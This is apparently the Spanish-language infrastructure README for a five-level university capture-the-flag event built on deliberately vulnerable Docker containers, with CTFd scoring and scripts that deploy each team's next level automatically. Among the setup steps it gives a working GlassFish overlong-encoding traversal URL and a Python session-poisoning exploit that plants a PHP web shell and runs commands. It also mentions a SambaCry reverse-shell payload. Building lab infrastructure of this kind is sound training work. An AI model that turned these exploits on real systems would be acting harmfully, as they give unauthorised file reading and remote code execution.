# CTF Tarreo — Infraestructura (5 niveles, multi-equipo)

Infra para un CTF universitario de **5 niveles secuenciales** sobre contenedores Docker
vulnerables, con **una instancia aislada por equipo+nivel**, validación de flags en **CTFd**
y **promoción automática** del nivel L+1 cuando un equipo resuelve el nivel L.

> Base de trabajo: `~/ctf-tarreo`  ·  Docker + Docker Compose v2  ·  red aislada del evento.

---

## 0. Decisiones de diseño (confirmadas)

| Tema | Decisión |
|------|----------|
| Nº de equipos | `NUM_TEAMS=5` (editable en `config.env`, bajable el día del evento) |
| Nivel 5 | **samba** (CVE-2017-7494). El `lvl5-tikiwiki` del enunciado se descartó (no había material; todo apuntaba a samba) |
| Flag lvl4 (php2shell) | **Única por equipo** vía su mecanismo nativo `FLAG` (env) |
| Samba | Puerto principal → **445** + 2º puerto por equipo → **6699** (bind-shell) |
| Flag path | **`/flag.txt`** en los 5 niveles (misma convención) |

### Niveles y vulnerabilidad

| L | Carpeta | CVE / vector | Tipo | Puerto interno |
|:-:|---------|--------------|------|:--------------:|
| 1 | `lvl1-apache-druid`  | CVE-2021-25646 (JS embebido) | RCE | 8888 (HTTP) |
| 2 | `lvl2-laravel`       | **CVE-2021-3129** (Laravel Ignition 2.5.1) | RCE | 80 (HTTP) |
| 3 | `lvl3-glassfish`     | CVE-2017-1000028 (UTF-8 overlong → traversal) | LFI | 4848 (**HTTPS**) |
| 4 | `lvl4-php2shell-ctf` | session poisoning → LFI → RCE | RCE | 80 (HTTP, nginx+FPM) |
| 5 | `lvl5-samba`         | CVE-2017-7494 (SambaCry) | RCE | 445 (SMB) + 6699 |

### Convención de flag

- Todas en **`/flag.txt`** dentro del contenedor, **nunca** accesible por HTTP sin explotar.
- Niveles 1,2,3,5: `FLAG{team<N>_lvl<L>_<8hex>}`, montada **read-only** desde
  `flags/team<N>/lvl<L>/flag.txt → /flag.txt:ro`. `chmod 644` (el proceso que obtiene la
  shell — root / www-data — la puede leer).
- Nivel 4: `php2shell{s3ss10n_p01s0n_t0_lf1_t0_rce_<8hex>}`, **única por equipo**. No se monta
  volumen RO porque el contenedor **escribe** `/flag.txt` él mismo desde la env `FLAG`; el
  script `deploy_level.sh` lee `flags/team<N>/lvl4/flag.txt` y la inyecta como `FLAG=...`.

### Verificación del LFI de glassfish (confirmado)

- Endpoint: `GET https://<ip>:4848/theme/META-INF/<traversal>`; decodifica mal el
  **UTF-8 Overlong Encoding** (`%c0%ae` → `.`), sin filtro de extensión.
- **`/flag.txt` en la raíz ES alcanzable** con el mismo payload que lee `/etc/passwd`,
  usando **10 `../`** (cada uno = `%c0%ae%c0%ae/`). Los `../` de más se recortan en `/`.
  El proceso corre como **root**; basta `chmod 644`. No se necesita excepción al path.

  ```
  https://<ip>:<puerto>/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/flag.txt
  ```

---

## 1. Esquema de puertos

`HOST_PORT = 8000 + (nivel*100) + equipo`  ·  samba bind = `9000 + 500 + equipo`

| Nivel \ Equipo | 1 | 2 | 3 | 4 | 5 |
|----------------|:--:|:--:|:--:|:--:|:--:|
| **L1** druid (http)      | 8101 | 8102 | 8103 | 8104 | 8105 |
| **L2** laravel (http)    | 8201 | 8202 | 8203 | 8204 | 8205 |
| **L3** glassfish (https) | 8301 | 8302 | 8303 | 8304 | 8305 |
| **L4** php2shell (http)  | 8401 | 8402 | 8403 | 8404 | 8405 |
| **L5** samba SMB         | 8501 | 8502 | 8503 | 8504 | 8505 |
| **L5** samba bind-shell  | 9501 | 9502 | 9503 | 9504 | 9505 |

CTFd: **http://&lt;ip&gt;:8000**

> Conexión por equipo: `http://<ip>:<puerto>` (L1,L2,L4) · `https://<ip>:<puerto>` con `-k` (L3) ·
> `smbclient //<ip>/myshare -N -p <puerto>` (L5, aunque el puerto SMB no estándar requiere
> túnel/redirección; ver nota de samba abajo).

---

## 1.bis  Arranque en UN solo comando (server nuevo o el del evento)

```bash
cd ~/ctf-tarreo
./bootstrap.sh            # hace TODO: flags, CTFd, admin+token, seed, Nivel 1, watcher
# variantes:
./bootstrap.sh --no-watch # todo menos lanzar el promotor
./bootstrap.sh --fresh    # regenera las flags desde cero (--force)
```

`bootstrap.sh` es idempotente: puedes re-ejecutarlo tras un fallo a mitad de evento sin
romper lo que ya funciona. El desglose manual (por si quieres control fino) está en §2.

### Montar en OTRO servidor — pasos

1. **Copiar** toda la carpeta `~/ctf-tarreo` **y** el repo de CTFd al nuevo server
   (ej. `rsync -a ~/ctf-tarreo nuevo:~/` y el repo CTFd a donde apunte `CTFD_REPO`).
2. **Editar `config.env`** en el nuevo server:
   - `CTFD_REPO` → ruta real del repo CTFd en ese server.
   - `SERVER_IP` → IP del server en la red del evento.
   - `NUM_TEAMS`, y las credenciales `CTFD_ADMIN_*` (cámbialas).
   - Deja `CTFD_TOKEN=""` vacío (lo genera el bootstrap allí).
3. **Requisitos** en el server: Docker + Compose v2, `python3` con `requests`
   (`pip install requests`).
4. **Imágenes Docker:**
   - *Con internet en el setup previo:* no hagas nada, el bootstrap las descarga/construye.
   - *Server sin internet (offline):* pre-cárgalas desde una máquina con red:
     ```bash
     # en una máquina con internet (una vez):
     docker save vulhub/apache-druid:0.20.0 vulhub/laravel:8.4.2 \
                 vulhub/glassfish:4.1 vulhub/samba:4.6.3 \
                 php:8.2-fpm nginx:alpine -o ctf-images.tar
     # (además, construye la imagen de CTFd y guárdala:)
     docker compose -p ctfd -f <CTFD_REPO>/docker-compose.yml build
     docker save <imagen_ctfd> mariadb:10.11 redis:4 nginx:stable alpine:3.23 -o ctfd-images.tar
     # copia los .tar al server offline y:
     docker load -i ctf-images.tar && docker load -i ctfd-images.tar
     ```
5. **Arrancar:** `./bootstrap.sh`

> Nota: `config.env` guarda el `CTFD_TOKEN` en claro. No subas la carpeta a un repo público.

---

## 2. Orden de ejecución el día del evento

```bash
cd ~/ctf-tarreo

# (1) Ajustar config si hace falta (nº de equipos, IP del server del evento)
#     editar config.env:  NUM_TEAMS=...   SERVER_IP=10.10.0.1

# (2) Generar las flags (idempotente; NO regenera las existentes)
scripts/generate_flags.sh
#     (para rehacer TODO desde cero, antes del evento:)  scripts/generate_flags.sh --force

# (3) Levantar CTFd (puerto 8000)  — requiere internet SOLO en este setup previo (build)
scripts/start_ctfd.sh
#     -> abrir http://127.0.0.1:8000  y completar el setup (crear admin)
#     -> Admin > Settings > Access Tokens > Generate Token
#     -> pegar el token en config.env:   CTFD_TOKEN="ctfd_..."

# (4) Sembrar los 5 challenges + todas las flags por equipo
python3 scripts/seed_ctfd.py

# (5) Levantar el Nivel 1 de TODOS los equipos
scripts/start_all_level1.sh

# (6) Arrancar el promotor automático en segundo plano
nohup python3 scripts/watch_and_promote.py >> logs/watch.out 2>&1 &
#     logs:  logs/promotions.log   y   logs/firstblood.log
```

A partir de aquí, cuando un equipo valide la flag de su nivel L en CTFd, el watcher
despliega automáticamente su nivel L+1 (hasta el 5).

### Al terminar

```bash
scripts/teardown.sh --all     # baja instancias + CTFd + mata el watcher
# o selectivo:
scripts/teardown.sh           # solo instancias de retos
scripts/teardown.sh --ctfd    # instancias + CTFd
```

---

## 3. Scripts

| Script | Qué hace |
|--------|----------|
| `config.env` | Config central (NUM_TEAMS, puertos, CTFd, SERVER_IP). La sourcean todos. |
| `scripts/generate_flags.sh [--force]` | Genera `flags/teamN/lvlL/flag.txt`. Idempotente. |
| `scripts/deploy_level.sh <eq> <lvl>` | Genera el compose de esa instancia y la levanta (`-p teamN_lvlL`). Idempotente. `DRY_RUN=1` solo renderiza. |
| `scripts/start_all_level1.sh` | Nivel 1 de todos los equipos. |
| `scripts/start_ctfd.sh` | Levanta CTFd desde el repo ya clonado (`CTFD_REPO`). |
| `scripts/seed_ctfd.py` | Crea 5 challenges (100/150/200/250/300) y carga todas las flags por equipo. Idempotente. |
| `scripts/watch_and_promote.py` | Polling a CTFd; promueve L→L+1; loguea first-blood. |
| `scripts/teardown.sh [--ctfd|--all]` | Baja y limpia todo (`down -v`). |

---

## 4. Checklist de verificación ANTES de abrir al público

Probar **cada exploit end-to-end** contra una instancia de prueba (equipo 1) y confirmar
que llega hasta `/flag.txt`. Levanta lo que necesites con `scripts/deploy_level.sh 1 <L>`.

- [ ] **CTFd** responde en `:8000`, setup hecho, token en `config.env`, 5 challenges sembrados
      con 5 flags cada uno (`python3 scripts/seed_ctfd.py` sin errores).
- [ ] **L1 druid** (`:8101`): RCE JS en `POST /druid/indexer/v1/sampler`; el proceso es **root**;
      `docker exec team1_lvl1-web-1 cat /flag.txt` ✔. Exploit: ver `cves/lvl1-apache-druid/poc.py`.
- [ ] **L2 laravel** (`:8201`): Ignition RCE (CVE-2021-3129) con `laravel-exploits/` + `phpggc`
      (`Laravel/RCE`). El worker es www-data → `/flag.txt` 644 legible. Comando sugerido en
      `cves/lvl2-laravel/CVE-2021-3129/README.md`.
- [ ] **L3 glassfish** (`https://:8301`, `-k`): el payload de 10×`../` con overlong encoding
      debe devolver el contenido de `/flag.txt` (ver payload arriba). Confirma que `root` corre
      el server y que `flag.txt` es 644.
- [ ] **L4 php2shell** (`:8401`): cadena session poison → LFI → RCE. **OJO (fairness):** el
      `PHPSESSID` debe ser **alfanumérico** (`A-Za-z0-9-,`); PHP 8.2 rechaza `_`. El solver
      incluido usa `ctf_pwn_session_1337` (con `_`) y **falla**: usar p.ej. `ctfpwn1337`.
      Prueba verificada:
      ```bash
      # progress field ANTES del file en el multipart; sess id sin "_"
      python3 - <<'PY'
      import requests; sid="ctfpwn1337"; t="http://127.0.0.1:8401"
      body=(b'--B\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
            b"<?php system($_GET['cmd']); ?>\r\n"
            b'--B\r\nContent-Disposition: form-data; name="file"; filename="x"\r\n\r\n'
            + b"A"*4096 + b"\r\n--B--\r\n")
      requests.post(f"{t}/index.php",data=body,headers={"Content-Type":"multipart/form-data; boundary=B"},cookies={"PHPSESSID":sid},timeout=10)
      print(requests.get(f"{t}/vuln.php",params={"page":f"/tmp/sessions/sess_{sid}","cmd":"cat /flag.txt"},cookies={"PHPSESSID":sid},timeout=10).text)
      PY
      ```
- [ ] **L5 samba** (SMB `:8501`, bind `:9501`): subir `.so` al share `myshare` (`/home/share`)
      y cargarla (SambaCry). El proceso es **root** → lee `/flag.txt`. El `payload.c` incluido
      apunta a `172.17.0.1`: **cada equipo debe recompilar** su `.so` con la IP de SU máquina
      (reverse), o usar bind-shell (puerto 6699 → `:950N`).
- [ ] **Promoción**: enviar una flag de prueba de L1 en CTFd y ver en `logs/promotions.log`
      que se despliega el L2 del equipo correspondiente.
- [ ] **Aislamiento**: cada instancia es `-p teamN_lvlL` con su red propia; verificar
      `docker ps` y que no hay choques de puertos.

### Nota sobre samba y puertos no estándar
`smbclient`/exploits esperan el SMB en 445. Al mapear puertos por equipo (8501…) el cliente
debe apuntar a ese puerto (`-p 850N`) o usar una redirección local. Si prefieres 445 real por
equipo, hazlo desde máquinas/VLAN distintas por equipo; en una sola PC se usan los puertos altos.

---

## 5. Restricciones y robustez

- **Sin internet durante el evento:** todas las imágenes vulhub ya están locales; `php:8.2-fpm`
  y `nginx:alpine` y la imagen de CTFd se descargan/construyen **en el setup previo** (con red)
  y quedan cacheadas. No se descarga nada durante la competencia.
- **Socket de Docker no expuesto** a los contenedores.
- **Nombres de proyecto únicos** `teamN_lvlL` → nada se pisa entre equipos/niveles.
- **Idempotencia:** re-ejecutar cualquier script no rompe lo ya levantado (`up -d`,
  flags no se regeneran, seed no duplica, el watcher no promueve dos veces).
